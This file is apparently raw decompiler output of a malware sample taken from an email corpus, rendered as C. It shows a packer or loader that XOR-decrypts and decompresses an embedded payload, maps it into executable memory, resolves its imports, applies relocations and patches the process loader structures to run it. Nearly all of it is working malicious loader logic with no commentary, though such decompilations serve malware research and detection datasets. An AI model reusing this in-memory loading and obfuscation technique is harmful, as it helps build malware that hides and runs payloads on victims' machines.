// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1363/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401030(Eq_27 dwArg04, Eq_27 dwArg08, Eq_27 dwArg0C)
{
	globals->dw40B330 = 0x00000000;
	while (globals->dw40B330 <u dwArg0C)
	{
		dwArg04[globals->dw40B330] = dwArg08[globals->dw40B330];
		globals->dw40B330 = globals->dw40B330 + 0x00000001;
	}
	return;
}

void fn004010C0(word32 ebx, word32 esi, word32 edi, Eq_212 * fs, word32 dwArg04)
{
	GetProcAddress(LoadLibraryA(0x0040B204), 0x0040B1EC)();
	lstrcatA(fp - 0x00000074, 0x0040B214);
	word32 eax_66 = CreateFileA(fp - 0x00000074, 0x00000001, 0x00000003, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	if (eax_66 != 0xFFFFFFFF && eax_66 != 0x00000000)
	{
		fp->dwFFFFFF50 = 0x0040B224;
		fp->dwFFFFFF50 = 0x0040B230;
		Mem134[fp - 0x000000B4:word32] = LoadLibraryA(0x00000080);
		code * eax_135 = GetProcAddress((Eq_1189 *) 0x00000080, 0x00000000);
		fp->dwFFFFFF50 = fp - 0x00000078;
		fp->dwFFFFFF50 = 0x0040B240;
		fp->dwFFFFFF50 = 0x80000000;
		eax_135();
		if ((fp - 0x00000078 & fp - 0x00000078) != 0x00000000)
		{
l0040134C:
			return;
		}
		else
		{
			fp->dwFFFFFF50 = 0x0040B248;
			fp->dwFFFFFF50 = 0x0040B254;
			Mem158[fp - 0x000000C0:word32] = LoadLibraryA(0x00000003);
			code * eax_159 = GetProcAddress((Eq_1189 *) 0x00000003, 0x00000000);
			fp->dwFFFFFF50 = fp - 0x00000078;
			fp->dwFFFFFF50 = 0x0040B264;
			fp->dwFFFFFF50 = 0x80000000;
			eax_159();
			if (eax_159 == null)
				goto l0040134C;
			else
			{
				Eq_27 eax_177 = GetModuleHandleA(0x00000000);
				if ((dwArg04 & 0x0000FFFF) != 0x00000000)
					globals->dw40B348 = 0x00000000;
				else
					globals->dw40B348 = 0x00000001;
				if (dwArg04 == 0x00000000)
				{
					globals->dw40B348 = 0x00000001;
					globals->dw40B348 = globals->dw40B348 - 0x00000001;
				}
				if (globals->dw40B348 != 0x00000000)
					globals->t40B338 = dwArg04;
				up32 edx_198 = globals->dw407000;
				up32 ecx_201 = globals->dw407004;
				up32 dwLoc08_203 = 0x00000000;
				while (dwLoc08_203 <u edx_198)
				{
					(dwLoc08_203 + 0x00407000)->dw0008 = (dwLoc08_203 + 0x00407000)->dw0008 ^ 0x00AA2C27;
					dwLoc08_203 = dwLoc08_203 + 0x00000008;
				}
				fp->dwFFFFFF50 = ecx_201;
				globals->dw40B344 = fn00401990(0x00000000);
				fp->dwFFFFFF50 = edx_198;
				fn00401B60(0x00407008, globals->dw40B344, 0x00000000);
				globals->dw40B334 = edi;
				globals->dw40B32C = esi;
				globals->dw40B340 = ebx;
				globals->ptr40B34C = fs->ptr0018;
				globals->dw40B33C = fp - 0x00000004;
				if (globals->dw40B348 != 0x00000000)
					fn004019C0(0x0040131E - dwArg04, dwArg04);
				else
					fn004019C0(0x0040131E - eax_177, eax_177);
				word32 eax_251 = globals->dw40B344;
				fn00401380(fp - 0x00000004, eax_251);
				Mem247[0x0040B350:word32]();
				return;
			}
		}
	}
	else
		goto l0040134C;
}

word32 fn00401360(Eq_27 dwArg04, word32 dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

void fn00401380(word32 ebp, word32 dwArg04)
{
	lstrcpyA(&fp->dwFFFFFF38, 0x0040B274);
	word32 eax_23 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_281 * dwLoc2C_167 = &eax_23->w0014 + (word32) eax_23->w0014;
	Eq_27 eax_40 = VirtualAlloc(0x00000000, eax_23->t0050, 0x00003000, 0x00000040);
	if (eax_40 == 0x00000000)
		;
	else
	{
		Mem130[fp - 0x000000C8:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[eax_23 + 0x00000006:word16] *s 0x00000028;
		Mem133[fp - 0x000000CC:word32] = dwArg04;
		fn00401030(eax_40, 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x0040B288;
		fp->dwFFFFFFE4 = 0x0040B298;
		Mem146[fp - 0x000000CC:word32] = GetModuleHandleA(0x00003000);
		code * eax_147 = GetProcAddress((Eq_1189 *) 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x0040B2A8;
		fp->dwFFFFFFE4 = 0x0040B2BC;
		Mem157[fp - 0x000000CC:word32] = GetModuleHandleA((Eq_1189 *) 0x00003000);
		code * eax_158 = GetProcAddress((Eq_1189 *) 0x00003000, 0x00000040);
		up32 dwLoc10_161 = 0x00000000;
		while (dwLoc10_161 <u (word32) eax_23->w0006)
		{
			if (dwLoc2C_167->dw0014 != 0x00000000 && dwLoc2C_167->dw0010 != 0x00000000)
			{
				word32 eax_201 = dwLoc2C_167->dw0010 - 0x00000001 + eax_23->t003C;
				fn00401030(eax_40 + Mem157[dwLoc2C_167 + 0x0000000C:word32], dwArg04 + Mem157[dwLoc2C_167 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_201) % eax_23->t003C, eax_201) /u eax_23->t003C *s eax_23->t003C);
			}
			dwLoc2C_167 = dwLoc2C_167 + 1;
			dwLoc10_161 = dwLoc10_161 + 0x00000001;
		}
		word32 ecx_229 = eax_40 + Mem157[eax_40 + 0x0000003C:word32];
		word32 eax_235 = Mem157[ecx_229 + 0x00000050:word32];
		fp->dwFFFFFFE4 = 0x00000004;
		eax_158();
		if (eax_235 == 0x00000000)
			;
		else
		{
			code * eax_261 = fn00401360(GetModuleHandleA(0x0040B2D8), 0x0040B2CC);
			word32 dwLocC0_268 = eax_40 + Mem241[ecx_229 + 0x00000080:word32];
			while (dwLocC0_268->dw0010 != 0x00000000)
			{
				Eq_453 * dwLoc38_296;
				Eq_454 * dwLoc28_295;
				Eq_27 eax_289 = LoadLibraryA(eax_40 + Mem241[dwLocC0_268 + 0x0000000C:word32]);
				if (dwLocC0_268->dw0000 != 0x00000000)
				{
					dwLoc28_295 = eax_40 + Mem241[dwLocC0_268 + 0x00000000:word32];
					dwLoc38_296 = eax_40 + Mem241[dwLocC0_268 + 0x00000010:word32];
				}
				else
				{
					dwLoc28_295 = eax_40 + Mem241[dwLocC0_268 + 0x00000010:word32];
					dwLoc38_296 = eax_40 + Mem241[dwLocC0_268 + 0x00000000:word32];
				}
				if (dwLocC0_268->dw0010 != 0x00000000 && dwLocC0_268->dw0000 != 0x00000000)
				{
					fp->dwFFFFFFE4 = 0x00000001;
					goto l004015C0;
				}
l004015C0:
				while (dwLoc28_295->ptr0000 != null)
				{
					if ((dwLoc28_295->ptr0000 & 0x80000000) != 0x00000000)
						dwLoc28_295->ptr0000 = fn00401360(eax_289, dwLoc28_295->ptr0000 & 0x7FFFFFFF);
					else
						Mem376[dwLoc28_295 + 0x00000000:word32] = fn00401360(eax_289, Mem241[dwLoc28_295 + 0x00000000:word32] + 0x00000002 + eax_40);
					if (dwLoc28_295->ptr0000 == null)
						goto l00401918;
					if (0x00000000 != 0x00000000)
						dwLoc38_296->ptr0000 = dwLoc28_295->ptr0000;
					dwLoc28_295 = dwLoc28_295 + 1;
					dwLoc38_296 = dwLoc38_296 + 1;
				}
				dwLocC0_268 = dwLocC0_268 + 1;
			}
			if (globals->dw40B348 != 0x00000000)
			{
				word32 edx_680 = Mem241[0x0040B338:word32] - Mem241[ecx_229 + 0x00000034:word32];
				if (Mem241[ecx_229 + 0x000000A4:word32] != 0x00000000)
				{
					word32 dwLoc24_689 = eax_40 + Mem241[ecx_229 + 0x000000A0:word32];
					while (dwLoc24_689->dw0004 != 0x00000000)
					{
						uint32 edx_704 = dwLoc24_689->dw0004 - 0x00000008 >>u 0x00000001;
						word16 * eax_707[] = &dwLoc24_689->a0008[0];
						uint32 dwLoc10_710 = 0x00000000;
						while (dwLoc10_710 <u edx_704)
						{
							if ((word32) eax_707[dwLoc10_710] >> 0x0000000C == 0x00000003)
								(eax_40 + Mem241[dwLoc24_689 + 0x00000000:word32])[(word32) eax_707[dwLoc10_710] & 0x00000FFF] = (eax_40 + Mem241[dwLoc24_689 + 0x00000000:word32])[(word32) eax_707[dwLoc10_710] & 0x00000FFF] + edx_680;
							dwLoc10_710 = dwLoc10_710 + 0x00000001;
						}
						dwLoc24_689 = dwLoc24_689 + Mem241[dwLoc24_689 + 0x00000004:word32];
					}
				}
			}
			Eq_27 eax_435;
			word32 esp_440;
			code * eax_422 = GetProcAddress(GetModuleHandleA(0x0040B2F8), 0x0040B2E8);
			if (globals->dw40B348 != 0x00000000)
			{
				Eq_27 edx_645 = globals->t40B338;
				Mem647[fp - 0x000000E0:word32] = edx_645;
				eax_435 = eax_235;
				esp_440 = fp - 0x000000F4;
				eax_422();
				globals->t40B328 = eax_235;
			}
			else
			{
				word32 edx_662 = Mem241[ecx_229 + 0x00000034:word32];
				Mem664[fp - 0x000000E0:word32] = edx_662;
				eax_435 = eax_235;
				esp_440 = fp - 0x000000F4;
				eax_422();
				globals->t40B328 = eax_235;
			}
			if (globals->t40B328 == 0x00000000)
			{
				word32 esp_513;
				if (globals->dw40B348 != 0x00000000)
				{
					esp_513 = fp - 0x000000F8;
					eax_147();
					if (eax_435 == 0x00000000)
					{
						esp_513 = fp - 0x00000104;
						eax_261();
						if (eax_435 == 0x00000000)
							;
						else
						{
l004017DC:
l00401808:
							if (globals->dw40B348 != 0x00000000)
							{
								Eq_27 ecx_557 = globals->t40B338;
								Eq_809 * esp_558 = esp_513 - 0x00000004;
								esp_558->t0000 = ecx_557;
								Mem561[esp_558 - 0x00000004:word32] = 0x00000000;
								Mem563[esp_558 - 0x00000008:word32] = 0x00000000;
								Mem565[esp_558 - 0x0000000C:word32] = 0x00000000;
								Mem567[esp_558 - 0x00000010:word32] = 0x00000022;
								esp_558->t0000 = eax_235;
								esp_440 = esp_558 - 0x00000014;
								eax_422();
								globals->t40B328 = eax_435;
							}
							else
							{
								word32 ecx_573 = Mem241[ecx_229 + 0x00000034:word32];
								Eq_778 * esp_574 = esp_513 - 0x00000004;
								esp_574->t0000 = ecx_573;
								Mem577[esp_574 - 0x00000004:word32] = 0x00000000;
								Mem579[esp_574 - 0x00000008:word32] = 0x00000000;
								Mem581[esp_574 - 0x0000000C:word32] = 0x00000000;
								Mem583[esp_574 - 0x00000010:word32] = 0x00000022;
								esp_574->t0000 = eax_235;
								esp_440 = esp_574 - 0x00000014;
								eax_422();
								globals->t40B328 = ecx_229;
							}
							if (globals->t40B328 == 0x00000000)
								if (globals->dw40B348 == 0x00000000)
								{
									Eq_884 * esp_528 = esp_440 - 0x00000004;
									esp_528->t0000.u0 = 0x00000040;
									esp_528->t0000.u0 = 0x00003000;
									Mem535[esp_528 - 0x00000008:word32] = Mem531[ecx_229 + 0x00000050:word32];
									Mem539[esp_528 - 0x0000000C:word32] = Mem535[ecx_229 + 0x00000034:word32];
									globals->t40B328 = VirtualAlloc(esp_528->t0000, esp_528->t0000, esp_528->t0000, esp_528->t0000);
									esp_440 = &esp_528->t0000;
								}
								else
								{
									Eq_845 * esp_543 = esp_440 - 0x00000004;
									esp_543->t0000.u0 = 0x00000040;
									esp_543->t0000.u0 = 0x00003000;
									Mem550[esp_543 - 0x00000008:word32] = Mem546[ecx_229 + 0x00000050:word32];
									Mem553[esp_543 - 0x0000000C:word32] = Mem550[0x0040B338:word32];
									globals->t40B328 = VirtualAlloc(esp_543->t0000, esp_543->t0000, esp_543->t0000, esp_543->t0000);
									esp_440 = &esp_543->t0000;
								}
l0040189C:
							Eq_670 * esp_454 = esp_440 - 0x00000004;
							esp_454->t0000 = eax_235;
							CloseHandle(esp_454->t0000);
							Mem461[esp_454 + 0x00000000:word32] = Mem455[ecx_229 + 0x00000050:word32];
							esp_454->t0000 = eax_40;
							esp_454->t0000 = globals->t40B328;
							fn00401030(dwArg00, dwArg04, dwArg08);
							if (globals->dw40B348 != 0x00000000)
							{
								Mem488[esp_454 + 0x00000000:word32] = Mem467[0x0040B328:word32] + Mem467[ecx_229 + 0x00000028:word32];
								esp_454->t0000 = globals->t40B338;
								fn00401920(dwArg00, dwArg04);
							}
							else
							{
								esp_454->t0000 = globals->t40B328;
								fn00401B30(dwArg00);
							}
							Mem478[0x0040B350:word32] = Mem467[0x0040B328:word32] + Mem467[ecx_229 + 0x00000028:word32];
							Mem481[ecx_229 + 0x00000028:word32] = Mem478[0x0040B350:word32];
						}
					}
					else
						goto l004017DC;
				}
				else
				{
					eax_435 = ecx_229;
					esp_513 = fp - 0x000000F8;
					eax_147();
					if (ecx_229 == 0x00000000)
					{
						eax_435 = Mem241[ecx_229 + 0x00000034:word32];
						esp_513 = fp - 0x00000104;
						eax_261();
						if (eax_435 == 0x00000000)
							;
						else
							goto l00401808;
					}
					else
						goto l00401808;
				}
			}
			else
				goto l0040189C;
		}
	}
l00401918:
	return;
}

void fn00401920(Eq_27 dwArg04, Eq_27 dwArg08)
{
	Eq_924 * ecx_14 = globals->ptr40B34C->ptr0030->ptr000C->ptr000C;
	Eq_924 * dwLoc0C_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0C_15 == null)
			goto l0040198C;
		if (dwLoc0C_15->dw0018 == dwArg04)
		{
			dwLoc0C_15->dw001C = dwArg08;
			goto l0040198C;
		}
		Eq_924 * eax_53 = dwLoc0C_15->ptr0000;
		dwLoc0C_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l0040198C;
	}
l0040198C:
	return;
}

word32 fn00401990(word32 dwArg04)
{
	return VirtualAlloc(0x00000000, dwArg04, 0x00003000, 0x00000004);
}

void fn004019C0(word32 dwArg04, Eq_27 dwArg08)
{
fn004019C0_entry:
l004019C0:
	Eq_27 dwLoc28_13
	branch globals->dw40B348 == 0x00000000 l004019DA
l004019D0:
	dwLoc28_13 = globals->t40B338;
	goto l004019E0
l004019DA:
	dwLoc28_13 = dwArg08;
l004019E0:
	word32 ecx_18 = dwLoc28_13 + Mem0[dwLoc28_13 + 0x0000003C:word32]
	code * eax_29 = GetProcAddress(GetModuleHandleA(0x0040B318), 0x0040B308)
	Eq_27 eax_37 = ecx_18->t0050
	eax_29()
	globals->t40B328 = eax_37;
	branch globals->t40B328 != 0x00000000 l00401A37
l00401A2D:
	goto l00401B29
l00401A37:
	fn00401030(globals->t40B328, dwLoc28_13, ecx_18->t0050)
	word32 edx_65 = globals->t40B328 - dwLoc28_13
	branch ecx_18->dw00A4 == 0x00000000 l00401B1E
l00401A6D:
	Eq_1009 * dwLoc0C_158 = dwLoc28_13 + Mem45[ecx_18 + 0x000000A0:word32]
l00401A7C:
	branch dwLoc0C_158->dw0004 == 0x00000000 l00401B1E
l00401A89:
	uint32 edx_106 = dwLoc0C_158->dw0004 - 0x00000008 >>u 0x00000001
	word16 * eax_109[] = &dwLoc0C_158->a0008[0]
	uint32 dwLoc08_112 = 0x00000000
	goto l00401AB2
l00401AA9:
	dwLoc08_112 = dwLoc08_112 + 0x00000001;
l00401AB2:
	branch dwLoc08_112 >=u edx_106 l00401B0D
l00401ABA:
	branch (word32) eax_109[dwLoc08_112] >> 0x0000000C != 0x00000003 l00401B0B
l00401ACC:
	(Mem45[0x0040B328:word32] + Mem45[dwLoc0C_158 + 0x00000000:word32])[(word32) eax_109[dwLoc08_112] & 0x00000FFF] = (Mem45[0x0040B328:word32] + Mem45[dwLoc0C_158 + 0x00000000:word32])[(word32) eax_109[dwLoc08_112] & 0x00000FFF] + edx_65;
l00401B0B:
	goto l00401AA9
l00401B0D:
	dwLoc0C_158 = dwLoc0C_158 + Mem45[dwLoc0C_158 + 0x00000004:word32];
	goto l00401A7C
l00401B1E:
l00401B29:
	return
fn004019C0_exit:
}

void fn00401B30(Eq_27 dwArg04)
{
	Eq_214 * edx_7 = globals->ptr40B34C;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

void fn00401B60(ptr32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	up32 dwLoc0C_112 = 0x00000001;
	byte cl_12 = *dwArg04;
	word32 dwLoc18_118 = 0x00000000;
	do
	{
		up32 ecx_34 = dwLoc0C_112 + 0x00000001;
		byte al_31 = dwArg04[dwLoc0C_112];
		dwLoc0C_112 = ecx_34;
		if ((word32) al_31 != (word32) cl_12)
		{
			dwArg08[dwLoc18_118] = al_31;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
		}
		else if ((word32) dwArg04[ecx_34] == 0x00000000)
		{
			dwArg08[dwLoc18_118] = cl_12;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
			dwLoc0C_112 = ecx_34 + 0x00000001;
		}
		else
		{
			word32 eax_98 = fn00401C60(fp - 0x00000010, dwArg04 + ecx_34) + ecx_34;
			dwLoc0C_112 = fn00401C60(fp - 0x00000020, dwArg04 + eax_98) + eax_98;
			up32 dwLoc1C_113 = 0x00000000;
			while (dwLoc1C_113 <u dwLoc10)
			{
				dwArg08[dwLoc18_118] = dwArg08[dwLoc18_118 - dwLoc20];
				dwLoc18_118 = dwLoc18_118 + 0x00000001;
				dwLoc1C_113 = dwLoc1C_113 + 0x00000001;
			}
		}
	} while (dwLoc0C_112 <u dwArg0C);
	return;
}

word32 fn00401C60(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc10_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		word32 ecx_26 = ecx_16 & 0x0000007F | dwLoc08_12 << 0x00000007;
		word32 edx_29 = dwLoc10_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_12 = ecx_26;
		dwLoc10_13 = edx_29;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_26;
	return edx_29;
}

